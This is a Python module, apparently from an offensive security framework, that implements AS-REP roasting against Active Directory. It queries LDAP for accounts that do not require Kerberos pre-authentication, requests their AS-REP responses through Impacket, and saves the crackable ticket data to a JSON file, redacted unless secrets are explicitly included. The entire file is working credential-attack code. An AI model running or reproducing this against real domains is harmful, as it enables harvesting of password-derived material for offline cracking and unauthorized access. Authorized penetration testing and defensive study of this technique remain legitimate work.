"""AS-REP roasting capability (Impacket-backed)."""

from __future__ import annotations

import json
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.redaction import redact
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_capability(
    id="asrep-roast",
    summary="Identify and roast accounts that do not require pre-authentication",
    category="credential-access",
    tags=("kerberos", "asrep", "preauth"),
)
class AsrepRoast:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        try:
            from impacket.krb5.kerberosv5 import getKerberosPreAuthentication
            from impacket.krb5 import constants
            from impacket.krb5.types import Principal
        except ImportError as exc:
            raise RuntimeError(
                "AS-REP roasting requires Impacket. Install with: pip install 'adaf-attack[kerberos]'"
            ) from exc

        console.print(f"[bold]AS-REP Roast[/bold] → {target.domain} @ {target.dc_ip}")

        # Find DONT_REQ_PREAUTH accounts via LDAP
        from ldap3 import ALL, SUBTREE, Connection, Server

        server = Server(target.dc_ip, get_info=ALL, use_ssl=target.ldaps)
        if target.username and (target.password or target.hashes):
            conn = Connection(
                server,
                user=target.auth_user,
                password=target.password or "",
                authentication="NTLM",
                auto_bind=True,
            )
        else:
            conn = Connection(server, auto_bind=True)

        base_dn = server.info.other.get("defaultNamingContext", [None])[0]
        if not base_dn:
            base_dn = ",".join(f"DC={p}" for p in target.domain.split("."))

        # userAccountControl bit 0x400000 = DONT_REQ_PREAUTH
        conn.search(
            base_dn,
            "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "userAccountControl"],
        )

        candidates = []
        for entry in conn.entries:
            sam = str(entry.sAMAccountName)
            candidates.append(sam)
            user_id = f"USER@{sam.upper()}@{target.domain.upper()}"
            graph.add_node(user_id, "User", sam=sam, dont_req_preauth=True)
            graph.add_edge(user_id, user_id, "CanASREP")

        conn.unbind()
        console.print(f"Found [cyan]{len(candidates)}[/cyan] AS-REP roastable accounts")

        roasted = []
        for sam in candidates:
            try:
                principal = Principal(sam, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                # Request AS-REP without pre-auth
                as_rep = getKerberosPreAuthentication(
                    principal,
                    target.domain.upper(),
                    target.dc_ip,
                )
                entry = {
                    "account": sam,
                    "asrep": str(as_rep),
                    "format": "impacket-raw",
                }
                roasted.append(entry)
                console.print(f"  [green]✓[/green] {sam}")
            except Exception as exc:  # noqa: BLE001
                console.print(f"  [red]✗[/red] {sam}  ({exc})")
                roasted.append({"account": sam, "error": str(exc)})

        result = {
            "domain": target.domain,
            "count": len(roasted),
            "tickets": roasted,
        }

        redacted = redact(result, include_secrets=include_secrets)
        out_path = session.path("asrep-roast.json")
        out_path.write_text(json.dumps(redacted, indent=2, default=str))
        graph.save(session.path("graph.json"))

        session.log("asrep-roast.complete", count=len(roasted), include_secrets=include_secrets)
        console.print(f"Results → {out_path}")
        if not include_secrets:
            console.print("[dim]Tickets redacted. Use --include-secrets to keep them.[/dim]")
        return redacted
